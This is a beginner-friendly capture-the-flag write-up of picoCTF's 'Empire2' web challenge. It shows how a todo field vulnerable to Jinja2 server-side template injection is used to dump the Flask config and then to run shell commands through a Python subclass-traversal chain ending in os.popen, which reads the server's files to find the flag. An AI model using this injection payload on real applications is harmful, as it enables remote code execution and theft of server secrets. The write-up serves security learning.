# Empire2

If you try the old SQL injection it doesn't work. It's filtered.

However it is vulnerable to Server Side template injection ([SSTI](https://medium.com/@nyomanpradipta120/ssti-in-flask-jinja2-20b068fdaeee))

For example if you create the todo `{{7*7}}` It shows up as `49`.

If we do `{{config}}` we get

```python
< Config {
  'ENV': 'production',
  'DEBUG': False,
  'TESTING': False,
  'PROPAGATE_EXCEPTIONS': None,
  'PRESERVE_CONTEXT_ON_EXCEPTION': None,
  'SECRET_KEY': 'picoCTF{your_flag_is_in_another_castle12345678}',
  'PERMANENT_SESSION_LIFETIME': datetime.timedelta(31),
  'USE_X_SENDFILE': False,
  'SERVER_NAME': None,
  'APPLICATION_ROOT': '/',
  'SESSION_COOKIE_NAME': 'session',
  'SESSION_COOKIE_DOMAIN': False,
  'SESSION_COOKIE_PATH': None,
  'SESSION_COOKIE_HTTPONLY': True,
  'SESSION_COOKIE_SECURE': False,
  'SESSION_COOKIE_SAMESITE': None,
  'SESSION_REFRESH_EACH_REQUEST': True,
  'MAX_CONTENT_LENGTH': None,
  'SEND_FILE_MAX_AGE_DEFAULT': datetime.timedelta(0, 43200),
  'TRAP_BAD_REQUEST_ERRORS': None,
  'TRAP_HTTP_EXCEPTIONS': False,
  'EXPLAIN_TEMPLATE_LOADING': False,
  'PREFERRED_URL_SCHEME': 'http',
  'JSON_AS_ASCII': True,
  'JSON_SORT_KEYS': True,
  'JSONIFY_PRETTYPRINT_REGULAR': False,
  'JSONIFY_MIMETYPE': 'application/json',
  'TEMPLATES_AUTO_RELOAD': None,
  'MAX_COOKIE_SIZE': 4093,
  'SQLALCHEMY_DATABASE_URI': 'sqlite://',
  'SQLALCHEMY_TRACK_MODIFICATIONS': False,
  'SQLALCHEMY_BINDS': None,
  'SQLALCHEMY_NATIVE_UNICODE': None,
  'SQLALCHEMY_ECHO': False,
  'SQLALCHEMY_RECORD_QUERIES': None,
  'SQLALCHEMY_POOL_SIZE': None,
  'SQLALCHEMY_POOL_TIMEOUT': None,
  'SQLALCHEMY_POOL_RECYCLE': None,
  'SQLALCHEMY_MAX_OVERFLOW': None,
  'SQLALCHEMY_COMMIT_ON_TEARDOWN': False,
  'SQLALCHEMY_ENGINE_OPTIONS': {},
  'BOOTSTRAP_USE_MINIFIED': True,
  'BOOTSTRAP_CDN_FORCE_SSL': False,
  'BOOTSTRAP_QUERYSTRING_REVVING': True,
  'BOOTSTRAP_SERVE_LOCAL': False,
  'BOOTSTRAP_LOCAL_SUBDOMAIN': None
} >
```

It looks like the flag is `picoCTF{your_flag_is_in_another_castle12345678}`, but alas it seems our flag is in another castle.

But with this, we cat start trying to execute python. Let's talk about this.

- `""` is a string literal.
- `"".__class__` is the class of a string literal, is `<class 'str'>`
- `"".__class__.__mro__` give the [**m**odule **r**esloution **o**rder](https://docs.python.org/3/library/stdtypes.html#class.__mro__) of the class (`(<class 'str'>, <class 'object'>)`)
- `"".__class__.__mro__[1]` is `<class 'object'>`. the base class 
- `"".__class__.__mro__[1].__subclasses__()` are all subclasses of the object class

Running `{{"".__class__.__mro__[1].__subclasses__()}}` as an input gives us every class in scope. 

This is realy long, but looking through this, index `117` is `<class 'os._wrap_close'>`

- `"".__class__.__mro__[1].__subclasses__()[117].__init__` is the init function to `os._wrap_close`
- `"".__class__.__mro__[1].__subclasses__()[117].__init__.__globals__` is the global scope to that function.
- `"".__class__.__mro__[1].__subclasses__()[117].__init__.__globals__["sys"]` is the sys module
- `"".__class__.__mro__[1].__subclasses__()[117].__init__.__globals__["sys"].modules` is the dictionary of all modules
- `"".__class__.__mro__[1].__subclasses__()[117].__init__.__globals__["sys"].modules["os"]` is the os module
- `"".__class__.__mro__[1].__subclasses__()[117].__init__.__globals__["sys"].modules["os"].popen` allows us to open a command.

What command do we want: `cat $(find . -type f) | grep picoCTF`. This:
- `find`s all files
- con`cat`enates them
- searches for the flag format.

That gives a final entry of `{{ "".__class__.__mro__[1].__subclasses__()[117].__init__.__globals__['sys'].modules['os'].popen("cat $(find . -type f) | grep picoCTF").read() }}`

This gives
```python
SECRET_KEY = 'picoCTF{your_flag_is_in_another_castle12345678}' 
secret = db.Column(db.String(128),default="picoCTF{its_a_me_your_flag786f93f7}") 
session['dark_secret'] = "picoCTF{its_a_me_your_flag786f93f7}" 
```

Flag: `picoCTF{its_a_me_your_flag786f93f7}`

---

Adapted from [redpwn's writeup](https://github.com/redpwn/picoCTF-2019/tree/master/web/Empire2) to be more beginner friendly.